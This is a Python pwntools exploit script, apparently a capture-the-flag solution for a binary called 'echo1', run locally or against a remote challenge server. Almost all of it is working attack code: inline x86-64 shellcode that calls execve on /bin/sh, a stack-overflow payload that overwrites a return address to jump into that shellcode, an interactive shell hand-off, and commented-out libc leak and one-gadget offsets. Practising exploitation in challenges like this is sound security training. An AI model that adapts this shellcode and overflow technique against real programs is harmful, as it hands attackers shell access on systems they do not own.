#coding:utf-8
import sys
from pwn import *
context.log_level='debug'
elfelf='./echo1'
context.arch='amd64'
while True :
	# try :
		if len(sys.argv)==1 :
			io=process(elfelf)
			# io=process(['./'],env={'LD_PRELOAD':'./'})
			elf=ELF(elfelf)
			libc=ELF('/lib/x86_64-linux-gnu/libc.so.6')
			ld = ELF('/lib/x86_64-linux-gnu/ld-2.23.so')
			one_gadgaet=[0x45226,0x4527a,0xf0364,0xf1207]
		else :
			io=remote('node3.buuoj.cn',28839)
			elf=ELF(elfelf)
			libc=ELF('/lib/x86_64-linux-gnu/libc.so.6')
			ld = ELF('/lib/x86_64-linux-gnu/ld-2.23.so')
			one_gadgaet=[0x45226,0x4527a,0xf0364,0xf1207]


		shell='''
		xor 	rsi,	rsi			
		push	rsi				
		mov 	rdi,	0x68732f2f6e69622f	 
		push	rdi
		push	rsp		
		pop	rdi				
		mov 	al,	59			
		cdq					
		syscall
		'''
		pay=asm(shell)
		io.recv()
		io.sendline(pay)
		io.recv()
		io.sendline('1')
		io.recv()
		# gdb.attach(io)
		io.sendline('a'*0x20+p64(0x000000000602098-8)+p64(0x400870)+p64(1))
		

		
		
		# libc_base=u64(io.recvuntil('\x7f')[-6:]+'\x00\x00')-libc.sym['__malloc_hook']-88-0x10
		# libc.address=libc_base
		# bin_sh_addr=libc.search('/bin/sh\x00').next()
		# system_addr=libc.sym['system']

		# success('heap_base:'+hex(heap_base))
		# success('libc_base:'+hex(libc_base))
		
		io.interactive()

	# except Exception as e:
	# 	io.close()
	# 	continue
	# else:
	# 	continue